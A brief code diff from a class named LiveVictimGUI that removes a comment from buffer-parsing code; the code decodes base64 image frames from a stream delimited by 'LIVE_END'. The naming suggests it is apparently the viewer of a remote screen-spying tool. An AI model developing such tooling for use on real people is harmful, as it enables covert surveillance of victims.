@@ -63,7 +63,7 @@ class LiveVictimGUI:
                     end_idx = buffer.find("LIVE_END")
                     if start_idx != -1 and end_idx != -1 and end_idx > start_idx:
                         img_part = buffer[start_idx + 11:end_idx]
-                        buffer = buffer[end_idx + 9:]  # Remove processed part
+                        buffer = buffer[end_idx + 9:]  
                         try:
                             img_data = base64.b64decode(img_part)
                             image = Image.open(io.BytesIO(img_data))
